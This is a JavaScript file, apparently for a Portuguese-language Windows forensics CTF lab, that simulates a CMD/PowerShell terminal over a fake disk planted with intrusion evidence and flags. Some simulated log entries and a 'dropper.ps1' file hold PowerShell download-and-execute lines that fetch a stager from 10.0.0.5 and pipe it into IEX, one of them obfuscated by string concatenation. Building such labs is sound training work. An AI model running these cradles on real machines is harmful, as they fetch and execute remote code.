/* ============================================================
   WinCTF — terminal simulado (CMD + PowerShell)
   ============================================================ */
(function () {
  'use strict';

  /* ---------------- filesystem ---------------- */
  const DISK = {
    'C:': {
      Windows: {
        System32: {
          'cmd.exe': { __file: '<binario do interpretador de comandos>' },
          'where.exe': { __file: '<utilitario de busca de executaveis no PATH>' },
          drivers: {
            etc: {
              hosts: {
                __file:
`# Copyright (c) 1993-2026 Microsoft Corp.
#
# Este arquivo contem o mapeamento de enderecos IP para nomes de host e e
# utilizado com preferencia sobre o DNS. Ele deve ficar em C:\\Windows\\System32\\drivers\\etc.
#
127.0.0.1       localhost
::1             localhost

# --- linhas adicionadas em 14/03 (suspeitas) ---
10.0.0.5        sync.corp.local`,
              },
            },
          },
          winevt: {
            Logs: {
              'Security.evtx': {
                __file:
`--- amostra exportada: wevtutil qe Security /c:8 /rd:true /f:text ---

Data: 14/03/2026 01:02:11
ID do Evento: 4624
  Conta: CORP\\jmoraes | Logon Type 3 | Fonte de rede: 192.168.1.50

Data: 14/03/2026 02:14:03
ID do Evento: 4624
  Conta: CORP\\svc_sql | Logon Type 3 | Fonte de rede: 10.0.0.66

Data: 14/03/2026 02:14:52
ID do Evento: 4672
  Conta: CORP\\svc_sql | Privilegios: SeDebugPrivilege | LogonId: 0x8f21c

Data: 14/03/2026 03:07:44
ID do Evento: 4625
  Conta: CORP\\svc_sql | Logon Type 3 | Sub Status: 0xC000006A | Origem: 10.0.0.66`,
              },
              'PowerShell-Operational.evtx': {
                __file:
`--- Microsoft-Windows-PowerShell/Operational ---

ID do Evento: 4104
  Script Block ID: 4e2c8f7a-9d11-4a6e-bb03-77c1e0a5d9f4
  Linha 1: $url = "http://10.0.0.5/stager.ps1"
  Linha 2: IEX (New-Object Net.WebClient).DownloadString($url)
  Conta: CORP\\jmoraes | PID: 4128`,
              },
              'System.evtx': {
                __file:
`--- System ---

ID do Evento: 7045 (Novo servico instalado)
  Nome do servico: WinUpdate
  Caminho: C:\\Users\\Public\\winupd.exe
  Tipo: user mode service | Inicio: Auto

ID do Evento: 7036 (Servico entrou em execucao)
  Nome: WinUpdate | Estado: running`,
              },
            },
          },
          WindowsPowerShell: {
            'powershell.exe': { __file: '<PowerShell host>' },
          },
        },
        Temp: {},
      },
      Users: {
        Public: {
          'notes.txt': {
            __file:
`anotacoes do analista - 14/03
================================
* auditar Run keys em todas as contas (autoruns)
* conferir C:\\Windows\\System32\\winevt\\Logs\\Security.evtx das 02:00
* a flag de teste deste laboratorio esta escondida aqui:
  CTF{terminal_explorer}`,
          },
          Downloads: {},
          bin: {
            'whoami.exe': { __file: '<binario FALSO plantado no PATH - C:\\Users\\Public\\bin>' },
          },
        },
        Administrator: { Desktop: {}, Documents: {} },
        jmoraes: { Desktop: {}, Documents: {} },
      },
      logs: {
        'auth.log': {
          __file:
`2026-03-14 02:11:03 CORP\\jmoraes AUTH OK
2026-03-14 02:14:22 CORP\\svc_backup AUTH FAIL
2026-03-14 02:15:40 CORP\\jmoraes AUTH OK
2026-03-14 02:31:09 CORP\\svc_backup AUTH FAIL
# auditoria manual: analista 14/03 - CTF{for_f_parse}`,
        },
      },
      ProgramData: {
        cache: {
          'dropper.ps1': {
            __file:
`$a = 'http'
$b = '://10.0.0'
$c = '.5/sync'
$d = '.ps1'
$target = $a + $b + $c + $d
(New-Object Net.WebClient).DownloadString($target) | IEX`,
          },
        },
      },
    },
  };

  /* ---------------- helpers de caminho ---------------- */
  function resolve(cwd, arg) {
    if (!arg) return cwd;
    arg = String(arg).replace(/"/g, '').replace(/\//g, '\\').trim();
    if (!arg) return cwd;
    let base;
    if (/^[a-zA-Z]:/.test(arg)) base = arg;
    else if (arg.startsWith('\\')) base = cwd.slice(0, 2) + arg;
    else base = cwd + '\\' + arg;
    const drive = base.slice(0, 2).toUpperCase();
    const parts = base.slice(2).split('\\');
    const stack = [];
    for (const p of parts) {
      if (!p || p === '.') continue;
      if (p === '..') stack.pop();
      else stack.push(p);
    }
    return drive + '\\' + stack.join('\\');
  }
  function getNode(path) {
    if (!/^[a-zA-Z]:/.test(path)) return null;
    const drive = path.slice(0, 2).toUpperCase();
    let node = DISK[drive];
    if (!node) return null;
    for (const part of path.slice(2).split('\\')) {
      if (!part) continue;
      const hit = Object.keys(node).find((k) => k.toLowerCase() === part.toLowerCase());
      if (!hit) return null;
      node = node[hit];
    }
    return node;
  }
  const isFile = (n) => n && typeof n === 'object' && Object.prototype.hasOwnProperty.call(n, '__file');
  function childBy(parent, name) {
    const hit = Object.keys(parent).find((k) => k.toLowerCase() === name.toLowerCase());
    return hit ? parent[hit] : null;
  }
  function pseudoDate(seed) {
    let h = 0;
    for (let i = 0; i < seed.length; i++) h = (h * 31 + seed.charCodeAt(i)) >>> 0;
    const d = 1 + (h % 27), m = 1 + ((h >> 5) % 12), hh = (h >> 9) % 24, mm = (h >> 13) % 60;
    const p = (n) => String(n).padStart(2, '0');
    return `${p(d)}/${p(m)}/2026  ${p(hh)}:${p(mm)}`;
  }
  const fmtSize = (n) => n.toLocaleString('pt-BR');

  /* ---------------- dados de saída ---------------- */
  const PROCS = [
    ['System Idle Process', '0', 'NT AUTHORITY\\SYSTEM', '0.1 K'],
    ['System', '4', 'NT AUTHORITY\\SYSTEM', '1.4 M'],
    ['svchost.exe', '1044', 'NT AUTHORITY\\SYSTEM', '28.6 M'],
    ['csrss.exe', '712', 'NT AUTHORITY\\SYSTEM', '5.2 M'],
    ['explorer.exe', '3980', 'CORP\\jmoraes', '72.4 M'],
    ['powershell.exe', '4128', 'CORP\\jmoraes', '41.9 M'],
    ['winupd.exe', '4472', 'CORP\\jmoraes', '9.8 M'],
    ['chrome.exe', '5210', 'CORP\\jmoraes', '210.3 M'],
  ];
  const SERVICES = [
    ['WinDefend', 'RUNNING', 'auto', 'Microsoft Defender Antivirus Service'],
    ['Spooler', 'RUNNING', 'auto', 'Print Spooler'],
    ['wuauserv', 'RUNNING', 'demand', 'Windows Update'],
    ['WinUpdate', 'RUNNING', 'auto', 'Windows Update Helper (suspeito)'],
    ['Themes', 'RUNNING', 'auto', 'Themes'],
    ['RemoteRegistry', 'STOPPED', 'disabled', 'Remote Registry'],
  ];
  const LOCAL_USERS = [
    ['Administrator', 'Enabled', 'Administradores'],
    ['jmoraes', 'Enabled', 'Usuarios'],
    ['svc_backup', 'Enabled', 'Administradores'],
    ['Guest', 'Disabled', 'Usuarios'],
  ];
  const NETSTAT = [
    ['TCP', '0.0.0.0:135', '0.0.0.0:0', 'LISTENING', '1044'],
    ['TCP', '0.0.0.0:445', '0.0.0.0:0', 'LISTENING', '4'],
    ['TCP', '192.168.1.50:49712', '10.0.0.5:80', 'ESTABLISHED', '4472'],
    ['TCP', '192.168.1.50:49680', '10.0.0.5:443', 'TIME_WAIT', '0'],
    ['UDP', '0.0.0.0:123', '*:*', '', '1120'],
  ];
  const REG_RUN = `

HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Run
    OneDrive    REG_SZ    "C:\\Users\\jmoraes\\AppData\\Local\\OneDrive\\OneDrive.exe" /background
    WinUpdate   REG_SZ    "C:\\Users\\Public\\winupd.exe" --minimized

HKEY_LOCAL_MACHINE\\Software\\Microsoft\\Windows\\CurrentVersion\\Run
    SecurityHealth    REG_SZ    %windir%\\system32\\SecurityHealthSystray.exe
`;
  const REG_PATH = `

HKEY_CURRENT_USER\\Environment
    Path    REG_EXPAND_SZ    %USERPROFILE%\\bin;C:\\Tools

HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\Session Manager\\Environment
    Path    REG_EXPAND_SZ    C:\\Users\\Public\\bin;C:\\Windows\\system32;C:\\Windows
`;
  const HELP_CMD =
`Comandos suportados (CMD):
  dir [p]        lista diretorio          type [arquivo]   mostra arquivo
  cd [p]         muda de pasta            pushd / popd     pilha de pastas
  findstr [/i] <texto> <arquivo>          echo <texto>     imprime texto
  set [VAR]      mostra variaveis         where <cmd>      procura no PATH
  whoami         usuario atual            hostname         nome da maquina
  ver            versao do Windows        cls              limpa a tela
  ipconfig       rede                     systeminfo       resumo do sistema
  tasklist       processos                netstat -ano     conexoes
  net user / net localgroup              sc query [svc]   servicos
  reg query <chave>                      fsutil volume diskfree c:
  powershell      entra no modo PowerShell   exit          volta ao menu

Dica: a flag do disco esta escondida em algum arquivo...`;
  const HELP_PS =
`Comandos suportados (PowerShell):
  Get-ChildItem [p] [-Force]      lista itens      (alias: dir, ls, gci)
  Get-Content <arq> [-Tail N]     le arquivo       (alias: type, cat, gc)
  Set-Location <p>                muda pasta       (alias: cd)
  Get-Process | Get-Service       processos / servicos
  Get-WinEvent -LogName Security [-MaxEvents N]
  Get-LocalUser / Get-LocalGroup Administrator
  Get-ComputerInfo / Get-ExecutionPolicy / $PSVersionTable
  Get-Date / Get-Location / Test-Path <p> / Get-Command <nome>
  Get-Help <nome>                 ajuda de um comando

Pipeline: ... | Where-Object {$_.Prop -like 'x*'} | Sort-Object Prop |
          Select-Object -First 3 | Measure-Object
cmd cls / Clear-Host limpa · cmd powershell volta ao CMD`;
  const VERSION =
`Microsoft Windows [Versao 10.0.26100.6584]`;

  /* ---------------- motor ---------------- */
  const Term = {
    shell: 'cmd',
    cwd: 'C:\\',
    stack: [],
    hist: [],
    hi: -1,
    outEl: null, inputEl: null, promptEl: null, bodyEl: null,
    onFlag: null,
    flagFound: false,
    _pending: '',

    init(els) {
      Object.assign(this, els);
      this.inputEl.addEventListener('keydown', (e) => this._key(e));
      this.bodyEl.addEventListener('click', () => this.inputEl.focus());
      this.reset();
    },

    reset() {
      this.shell = 'cmd';
      this.cwd = 'C:\\';
      this.stack = [];
      this.hist = [];
      this.hi = -1;
      this.outEl.innerHTML = '';
      this._banner();
      this._prompt();
    },

    setShell(s) {
      if (s === this.shell) return;
      this.shell = s;
      this.cwd = s === 'ps' ? 'C:\\' : this.cwd;
      if (s === 'ps') {
        this.line('Windows PowerShell', 'ps');
        this.line('Copyright (C) Microsoft Corporation. Todos os direitos reservados.', 'dim');
        this.line('', '');
        this.line('Carregando o módulo de console...', 'dim');
        this.line('', '');
      } else {
        this.line(VERSION, 'sys');
        this.line('', '');
      }
      this._prompt();
      this.inputEl.focus();
    },

    _banner() {
      this.line(VERSION, 'sys');
      this.line('Digite "help" para ver os comandos disponiveis.', 'dim');
      this.line('Existe uma flag escondida em algum arquivo deste disco. Vale 50 pontos.', 'dim');
      this.line('', '');
    },

    line(text, cls) {
      const span = document.createElement('span');
      span.className = 'ln' + (cls ? ' ' + cls : '');
      span.textContent = text;
      this.outEl.appendChild(span);
      this._checkFlag(text);
    },
    raw(html, cls) {
      const span = document.createElement('span');
      span.className = 'ln' + (cls ? ' ' + cls : '');
      span.innerHTML = html;
      this.outEl.appendChild(span);
    },
    _checkFlag(text) {
      if (this.flagFound || !/CTF\{[a-z0-9_]+\}/i.test(text)) return;
      if (/terminal_explorer/i.test(text)) {
        this.flagFound = true;
        this.line('  >>> FLAG DESCOBERTA NO DISCO: CTF{terminal_explorer} <<<', 'flag-found');
        if (this.onFlag) this.onFlag('CTF{terminal_explorer}');
      }
    },
    _prompt() {
      this.promptEl.textContent = this.shell === 'ps' ? `PS ${this.cwd}>` : `${this.cwd}>`;
      this.promptEl.classList.toggle('ps-mode', this.shell === 'ps');
    },

    _key(e) {
      if (e.key === 'Enter') {
        const cmd = this.inputEl.value;
        this.inputEl.value = '';
        this.raw(`<span class="ln">${this._promptHTML()}${escapeHtml(cmd)}</span>`);
        if (cmd.trim()) { this.hist.push(cmd); }
        this.hi = this.hist.length;
        this.execute(cmd);
        this._prompt();
        this.bodyEl.scrollTop = this.bodyEl.scrollHeight;
      } else if (e.key === 'ArrowUp') {
        e.preventDefault();
        if (this.hi > 0) { this.hi--; this.inputEl.value = this.hist[this.hi] || ''; }
      } else if (e.key === 'ArrowDown') {
        e.preventDefault();
        if (this.hi < this.hist.length - 1) { this.hi++; this.inputEl.value = this.hist[this.hi] || ''; }
        else { this.hi = this.hist.length; this.inputEl.value = ''; }
      } else if (e.key === 'Tab') {
        e.preventDefault();
        this._complete();
      }
    },
    _promptHTML() {
      return `<span class="${this.shell === 'ps' ? 'ps' : 'ok'}">${escapeHtml(this.shell === 'ps' ? 'PS ' + this.cwd + '>' : this.cwd + '>')}</span> `;
    },
    _complete() {
      const v = this.inputEl.value;
      const m = v.match(/^(cd|Set-Location|Get-ChildItem|type|Get-Content|dir|ls)\s+(\S*)$/i);
      if (!m) return;
      const dirArg = m[2];
      const idx = dirArg.lastIndexOf('\\');
      const dirPart = idx >= 0 ? dirArg.slice(0, idx + 1) : '';
      const namePart = idx >= 0 ? dirArg.slice(idx + 1) : dirArg;
      const dirPath = resolve(this.cwd, dirPart || '.');
      const node = getNode(dirPath);
      if (!node || isFile(node)) return;
      const hits = Object.keys(node).filter((k) => k.toLowerCase().startsWith(namePart.toLowerCase()));
      if (hits.length === 1) this.inputEl.value = `${m[1]} ${dirPart}${hits[0]}`;
    },

    execute(raw) {
      const cmd = raw.trim();
      if (!cmd) return;
      if (this.shell === 'cmd') this._runCmd(cmd);
      else this._runPs(cmd);
    },

    /* ---------------- CMD ---------------- */
    _runCmd(c) {
      const parts = splitArgs(c);
      let op = parts[0].toLowerCase();

      if (op === 'cls' || op === 'clear') { this.outEl.innerHTML = ''; return; }
      if (op === 'help' || op === '?' || op === '-?' || op === '/?') { HELP_CMD.split('\n').forEach((l) => this.line(l, 'dim')); return; }
      if (op === 'exit') { this.line('Encerrando a sessao do CMD... (continue digitando para voltar)', 'sys'); return; }
      if (op === 'powershell') {
        const rest = c.slice(parts[0].length).trim();
        if (rest) { this.setShellSilent('ps'); this._runPs(rest); this.setShellSilent('cmd'); }
        else this.setShell('ps');
        return;
      }
      if (op === 'echo') {
        const arg = c.slice(4).trim();
        if (!arg) { this.line('ECHO está ativado.'); return; }
        this.line(expandVars(arg));
        return;
      }
      if (op === 'ver') { this.line(VERSION, 'sys'); return; }
      if (op === 'whoami') {
        this.line('corp\\analista');
        if (/\/priv/.test(c)) {
          this.line('', '');
          this.line('PRIVILEGIOS DO USUÁRIO', 'sys');
          this.line('---------------------------------------------');
          this.line('SeShutdownPrivilege                   Desativar sistema               Desabilitado');
          this.line('SeDebugPrivilege                     Depurar programas                Desabilitado');
        }
        return;
      }
      if (op === 'hostname') { this.line('SRV-WEB01'); return; }
      if (op === 'cd' || op === 'chdir') {
        const arg = parts.slice(1).join(' ').replace(/"/g, '');
        if (!arg) { this.line(this.cwd); return; }
        const target = resolve(this.cwd, arg);
        const node = getNode(target);
        if (!node || isFile(node)) { this.line('O sistema não pode encontrar o caminho especificado.', 'err'); return; }
        this.cwd = target;
        return;
      }
      if (op === 'pushd') {
        const arg = parts.slice(1).join(' ').replace(/"/g, '') || '.';
        const target = resolve(this.cwd, arg);
        const node = getNode(target);
        if (!node || isFile(node)) { this.line('O sistema não pode encontrar o caminho especificado.', 'err'); return; }
        this.stack.push(this.cwd); this.cwd = target; return;
      }
      if (op === 'popd') {
        if (!this.stack.length) { this.line('O diretório da pilha está vazio.', 'err'); return; }
        this.cwd = this.stack.pop(); return;
      }
      if (op === 'dir') {
        const arg = parts.slice(1).filter((p) => !p.startsWith('/')).join(' ').replace(/"/g, '');
        this._dir(resolve(this.cwd, arg || '.')); return;
      }
      if (op === 'type' || op === 'more') {
        const arg = parts.slice(1).join(' ').replace(/"/g, '');
        if (!arg) { this.line('A sintaxe do comando está incorreta.', 'err'); return; }
        this._type(resolve(this.cwd, arg)); return;
      }
      if (op === 'findstr') {
        const noSwitch = parts.filter((p, i) => i > 0 && !p.startsWith('/'));
        const term = noSwitch[0], file = noSwitch.slice(1).join(' ').replace(/"/g, '');
        if (!term || !file) { this.line('A sintaxe do comando está incorreta.', 'err'); return; }
        const node = getNode(resolve(this.cwd, file));
        if (!node || !isFile(node)) { this.line('O sistema não pode encontrar o arquivo especificado.', 'err'); return; }
        const ci = parts.some((p) => /^\/i$/i.test(p));
        const re = new RegExp(escapeRe(term), ci ? 'i' : '');
        const lines = node.__file.split('\n').filter((l) => re.test(l));
        if (!lines.length) { this.line('Não foi encontrado o texto especificado no arquivo.', 'err'); return; }
        lines.forEach((l) => this.line(l));
        return;
      }
      if (op === 'set') {
        const key = parts.slice(1).join(' ').toUpperCase();
        const vars = {
          PATHEXT: '.COM;.EXE;.BAT;.CMD;.PS1;.VBS',
          PROCESSOR_ARCHITECTURE: 'AMD64',
          COMPUTERNAME: 'SRV-WEB01',
          USERDOMAIN: 'CORP',
          USERNAME: 'analista',
          TEMP: 'C:\\Users\\analista\\AppData\\Local\\Temp',
          SYSTEMROOT: 'C:\\Windows',
          PATH: 'C:\\Users\\Public\\bin;C:\\Windows\\system32;C:\\Windows;C:\\Tools',
        };
        if (!key) { Object.entries(vars).forEach(([k, v]) => this.line(`${k}=${v}`)); return; }
        Object.entries(vars).filter(([k]) => k.includes(key)).forEach(([k, v]) => this.line(`${k}=${v}`));
        return;
      }
      if (op === 'where') {
        const name = (parts[1] || '').replace(/"/g, '');
        if (!name) { this.line('A sintaxe do comando está incorreta.', 'err'); return; }
        const target = name.toLowerCase().endsWith('.exe') ? name : name + '.exe';
        const found = [];
        if (childBy(DISK['C:'].Users.Public.bin, target)) found.push('C:\\Users\\Public\\bin\\' + target);
        if (/^(cmd|where|type|dir|findstr|ipconfig|systeminfo|tasklist|netstat|whoami|hostname|ping|net|sc|reg|fsutil)\.exe$/i.test(target))
          found.push('C:\\Windows\\System32\\' + target);
        if (!found.length) { this.line(`INFO: não foi possível encontrar o arquivo ${name}.`, 'err'); return; }
        found.forEach((f) => this.line(f));
        return;
      }
      if (op === 'ipconfig') {
        this.line('');
        this.line('Configuração de IP do Windows (modo resumido)', 'sys');
        this.line('');
        this.line('Adaptador Ethernet Ethernet:', 'dir');
        this.line('   Sufixo DNS específico IPv6. . . : corp.local');
        this.line('   Endereço IPv4. . . . . . . . . . : 192.168.1.50');
        this.line('   Máscara de Sub-rede . . . . . . : 255.255.255.0');
        this.line('   Padrão de Gateway . . . . . . .  : 192.168.1.1');
        this.line('');
        this.line('   Endereço Físico. . . . . . . . . : 00-15-5D-8A-2F-91');
        return;
      }
      if (op === 'systeminfo') {
        [
          'Nome do host:                 SRV-WEB01',
          'Nome do sistema operacional:  Microsoft Windows 11 Pro',
          'Versão do sistema:            10.0.26100 N/D Compilacao 26100',
          'Registrado para:              CORP (licenca OEM)',
          'ID do produto:                00331-10000-00001-AA777',
          'Boot Time:                    14/03/2026, 00:41:12',
          'Fabricante do sistema:        Microsoft Corporation',
          'Modelo do sistema:            Virtual Machine',
          'Processador(es):              1 processador(es) instalado(s) [AMD64 Family 25 Model 1 Stepping 1]',
          'Total de Memoria Fisica:      8.192 MB',
          'Domínio:                      corp.local',
          'Servidor de logon:            \\SRV-DC01',
          'Hotfix(es):                   4 hotfix(es) instalado(s) [KB5058499, KB5060842, KB5062553, KB5063878]',
        ].forEach((l) => this.line(l));
        return;
      }
      if (op === 'tasklist') {
        this.line('');
        this.line('Nome de imagem               PID Nome do pacote          Uso de memória', 'sys');
        this.line('========================= ======== ==================== ============');
        PROCS.forEach(([n, pid, _u, mem]) => this.line(n.padEnd(26) + ' ' + String(pid).padStart(8) + ' ' + ''.padEnd(20) + ' ' + mem.padStart(11)));
        return;
      }
      if (op === 'netstat') {
        this.line('');
        this.line('Conexões ativas', 'sys');
        this.line('');
        this.line('  Proto  Endereço local        Endereço remoto       Estado            PID');
        NETSTAT.forEach(([p, l, r, s, pid]) =>
          this.line('  ' + p.padEnd(6) + l.padEnd(22) + r.padEnd(22) + s.padEnd(18) + pid));
        return;
      }
      if (op === 'net') {
        const sub = (parts[1] || '').toLowerCase();
        if (sub === 'user') {
          this.line('');
          this.line('Contas de usuário do \\SRV-WEB01', 'sys');
          this.line('-------------------------------------------------------------------------------');
          LOCAL_USERS.forEach(([n]) => this.line('  ' + n));
          this.line('O comando terminou com sucesso.');
          return;
        }
        if (sub === 'localgroup') {
          const g = (parts[2] || 'administrators').toLowerCase();
          this.line('');
          this.line(`Membros do grupo ${g || 'administrators'}`, 'sys');
          this.line('-------------------------------------------------------------------------------');
          if (/admin/.test(g)) { this.line('  Administrator'); this.line('  CORP\\Domain Admins'); this.line('  CORP\\svc_backup'); }
          else LOCAL_USERS.forEach(([n]) => this.line('  ' + n));
          this.line('O comando terminou com sucesso.');
          return;
        }
        this.line('A sintaxe do comando está incorreta.', 'err');
        return;
      }
      if (op === 'sc') {
        const sub = (parts[1] || '').toLowerCase();
        if (sub === 'query') {
          const name = parts[2];
          if (!name) {
            this.line('');
            this.line('Nome do serviço         Estado               Tipo                  Conta', 'sys');
            this.line('======================= ===================== ===================== ===========');
            SERVICES.forEach(([n, st, ty]) => this.line(n.padEnd(23) + (st === 'RUNNING' ? 'RUNNING              ' : 'STOPPED              ') + (ty === 'auto' ? 'AUTO_START           ' : ty === 'disabled' ? 'DISABLED             ' : 'DEMAND_START         ') + 'LocalSystem'));
            return;
          }
          const svc = SERVICES.find(([n]) => n.toLowerCase() === name.toLowerCase());
          if (!svc) { this.line(`O serviço não existe.` , 'err'); return; }
          this.line('');
          this.line(`SERVICE_NAME: ${svc[0]}`);
          this.line(`  TYPE               : 10  WIN32_OWN_PROCESS`);
          this.line(`  STATE              : 4  RUNNING`);
          this.line(`  WIN32_EXIT_CODE    : 0  (0x0)`);
          this.line(`  START_TYPE         : 2   AUTO_START`);
          if (svc[0] === 'WinUpdate') this.line(`  BINARY_PATH_NAME   : C:\\Users\\Public\\winupd.exe`, 'warn');
          return;
        }
        this.line('A sintaxe do comando está incorreta.', 'err');
        return;
      }
      if (op === 'reg') {
        const sub = (parts[1] || '').toLowerCase();
        if (sub !== 'query') { this.line('A sintaxe do comando está incorreta.', 'err'); return; }
        const path = parts.slice(2).join(' ').replace(/"/g, '');
        if (!path) { this.line('A sintaxe do comando está incorreta.', 'err'); return; }
        if (/currentversion\\run/i.test(path)) { this.line(REG_RUN); return; }
        if (/\\path$|^path$/i.test(path) || /environment/i.test(path)) { this.line(REG_PATH); return; }
        if (/services/i.test(path)) {
          this.line('');
          SERVICES.forEach(([n, st, ty, desc]) => {
            this.line(`HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Services\\${n}`);
            this.line(`    DisplayName    REG_SZ    ${desc}`);
            this.line(`    Start          REG_DWORD    ${ty === 'auto' ? 0x2 : ty === 'disabled' ? 0x4 : 0x3}`);
            this.line('');
          });
          return;
        }
        this.line('ERRO: o sistema não pode encontrar o caminho do registro especificado.', 'err');
        return;
      }
      if (op === 'fsutil') {
        if (/diskfree/i.test(c)) {
          this.line('Espaço livre em bytes:   81234567890');
          this.line('Espaço total em bytes:   136831887360');
          this.line('Espaço livre disponível: 81234567890');
          return;
        }
        this.line('A sintaxe do comando está incorreta.', 'err');
        return;
      }
      if (op === 'ping') {
        const alvo = parts[1] || '127.0.0.1';
        this.line('');
        this.line(`Disparando ${alvo} com 32 bytes de dados:`);
        [1, 2, 3, 4].forEach((i) => this.line(`Resposta de ${alvo}: bytes=32 tempo=12ms TTL=122`));
        this.line('');
        this.line('Estatísticas do ping para ' + alvo + ':');
        this.line('    Pacotes: Enviados = 4, Recebidos = 4, Perdidos = 0 (0% de perda),');
        return;
      }

      this.line(`'${parts[0]}' não é reconhecido como um comando interno ou externo, um programa operável ou um arquivo em lotes com extensão .bat.`, 'err');
    },

    setShellSilent(s) { const prev = this.shell; this.shell = s; this._prompt(); if (prev) { /* mantém */ } },

    _dir(path) {
      const node = getNode(path);
      if (!node) { this.line('O sistema não pode encontrar o caminho especificado.', 'err'); return; }
      if (isFile(node)) {
        this.line(' O volume na unidade C não tem nome.');
        this.line(' O número de série do volume é: 1A2B-3C4D', 'sys');
        this.line('');
        this.line(` Diretório de ${path}`);
        this.line('');
        this.line(`${pseudoDate(path)}    ${fmtSize(node.__file.length).padStart(14)} ${path.split('\\').pop()}`);
        this.line(`               1 Arquivo(s)     ${fmtSize(node.__file.length)} bytes`);
        return;
      }
      const names = Object.keys(node).filter((k) => k !== '__file');
      const files = names.filter((k) => isFile(node[k]));
      const dirs = names.filter((k) => !isFile(node[k]));
      this.line(' O volume na unidade C não tem nome.');
      this.line(' O número de série do volume é: 1A2B-3C4D', 'sys');
      this.line('');
      this.line(` Diretório de ${path}`);
      this.line('');
      dirs.forEach((d) => this.line(`${pseudoDate(path + d)}    ${'<DIR>'.padStart(14)}          ${d}`));
      files.forEach((f) => this.line(`${pseudoDate(path + f)}    ${fmtSize(node[f].__file.length).padStart(14)} ${f}`));
      this.line(`               ${files.length} Arquivo(s)     ${fmtSize(files.reduce((s, f) => s + node[f].__file.length, 0))} bytes`);
      this.line(`               ${dirs.length + 2} Dir(s)   81.234.567.890 bytes livres`);
    },

    _type(path) {
      const node = getNode(path);
      if (!node) { this.line('O sistema não pode encontrar o arquivo especificado.', 'err'); return; }
      if (!isFile(node)) { this.line('Acesso negado ao diretório (use dir).', 'err'); return; }
      node.__file.split('\n').forEach((l) => this.line(l));
    },

    /* ---------------- PowerShell ---------------- */
    _runPs(c) {
      if (/^(cls|clear|clear-host)$/i.test(c.trim())) { this.outEl.innerHTML = ''; return; }
      if (/^help$|^\?$|get-help$/i.test(c.trim())) { HELP_PS.split('\n').forEach((l) => this.line(l, 'dim')); return; }
      if (/^cmd$/i.test(c.trim())) { this.setShell('cmd'); return; }
      if (/^\$PSVersionTable$/i.test(c.trim())) {
        this.line('');
        this.line('Name                           Value');
        this.line('----                           -----');
        this.line('PSVersion                      7.4.6');
        this.line('PSEdition                      Core');
        this.line('GitCommitId                    7.4.6');
        this.line('OS                             Microsoft Windows 10.0.26100');
        this.line('Platform                       Win32NT');
        this.line('PSCompatibleVersions           1.0 2.0 3.0 4.0 5.0 5.1 6.0 7.0');
        return;
      }

      // pipeline
      const stages = c.split('|').map((s) => s.trim()).filter(Boolean);
      let data = this._psStage(stages[0], null);
      for (let i = 1; i < stages.length; i++) {
        if (data === undefined) return;
        data = this._psStage(stages[i], data);
      }
      if (data === undefined) return;
      if (data === null) return;
      if (Array.isArray(data)) this._renderObjects(data);
      else if (typeof data === 'string') this.line(data);
      else if (typeof data === 'object') this._renderObjects([data]);
    },

    _psStage(stage, data) {
      const m = stage.match(/^([A-Za-z-]+)\s*(.*)$/);
      if (!m) { this.line(`'${stage}' não é reconhecido como um cmdlet.`, 'err'); return undefined; }
      const name = m[1].toLowerCase().replace(/[^a-z-]/g, '');
      let args = m[2] || '';

      const getArg = (flag) => {
        const r = stage.match(new RegExp(flag + '\\s+([^\\s|]+)', 'i'));
        return r ? r[1].replace(/['"]/g, '') : null;
      };
      const getList = (flag) => {
        const r = stage.match(new RegExp(flag + '\\s+([^|]+?)(?=\\s+[A-Za-z]+\\s+-|\\s*$|\\|)', 'i'));
        return r ? r[1].trim().replace(/['"]/g, '').split(',').map((s) => s.trim()) : null;
      };

      switch (name) {
        case 'get-date':
          return 'quinta-feira, 14 de março de 2026 02:17:43';
        case 'get-location':
          return `Path: ${this.cwd}`;
        case 'get-executionpolicy':
          return 'Undefined';
        case 'get-computerinfo':
          return [
            'CsName                : SRV-WEB01',
            'WindowsProductName    : Windows 11 Pro',
            'WindowsVersion        : 24H2',
            'OsBuildNumber         : 26100',
            'CsDomain              : corp.local',
            'CsManufacturer        : Microsoft Corporation',
            'OsArchitecture        : 64-bit',
            'CsTotalPhysicalMemory : 8.589.934.592',
          ].join('\n');
        case 'get-localuser':
          return LOCAL_USERS.map(([n, st]) => ({ Name: n, Enabled: st, PrincipalSource: 'Computer' }));
        case 'get-localgroup':
        case 'get-localgroupmember': {
          const g = /admin/i.test(args) ? 'Administrators' : (args.split(/\s+/).pop() || 'Users');
          if (/admin/i.test(g)) return ['Administrator', 'CORP\\Domain Admins', 'CORP\\svc_backup'].map((n) => ({ Group: 'Administrators', Name: n, ObjectClass: 'user' }));
          return LOCAL_USERS.map(([n]) => ({ Group: g, Name: n, ObjectClass: 'user' }));
        }
        case 'get-process':
          return PROCS.map(([n, pid, u, mem]) => ({ Name: n, Id: Number(pid), CPU: Number((pid * 3.17).toFixed(2)), WorkingSet: mem, UserName: u }));
        case 'get-service':
          return SERVICES.map(([n, st, ty, desc]) => ({ Name: n, Status: st === 'RUNNING' ? 'Running' : 'Stopped', StartType: ty === 'auto' ? 'Automatic' : ty === 'disabled' ? 'Disabled' : 'Manual', DisplayName: desc }));
        case 'get-winevent': {
          const log = (getArg('-LogName') || (/LogName\s*=\s*'?([A-Za-z-]+)'?/i.exec(stage) || [])[1] || 'Security').replace(/\..*$/, '');
          const idMatch = stage.match(/ID\s*=\s*(\d+)/i);
          let rows;
          const logName = log.replace('.evtx', '');
          if (/powershell/i.test(logName)) {
            rows = [{ TimeCreated: '14/03/2026 02:16:44', Id: 4104, LevelDisplayName: 'Information', Message: 'ScriptBlock: $url = "http://10.0.0.5/stager.ps1"; IEX (New-Object Net.WebClient).DownloadString($url); # CTF{scriptblock_4104}' }];
          } else if (/system/i.test(logName)) {
            rows = [
              { TimeCreated: '14/03/2026 02:15:02', Id: 7045, LevelDisplayName: 'Information', Message: 'Novo serviço instalado: WinUpdate -> C:\\Users\\Public\\winupd.exe' },
              { TimeCreated: '14/03/2026 02:15:03', Id: 7036, LevelDisplayName: 'Information', Message: 'O serviço WinUpdate entrou em execução' },
            ];
          } else {
            rows = [
              { TimeCreated: '14/03/2026 01:02:11', Id: 4624, LevelDisplayName: 'Information', Message: 'Conta: CORP\\jmoraes | Logon Type 3 | Origem: 192.168.1.50' },
              { TimeCreated: '14/03/2026 02:14:03', Id: 4624, LevelDisplayName: 'Information', Message: 'Conta: CORP\\svc_sql | Logon Type 3 | Origem: 10.0.0.66' },
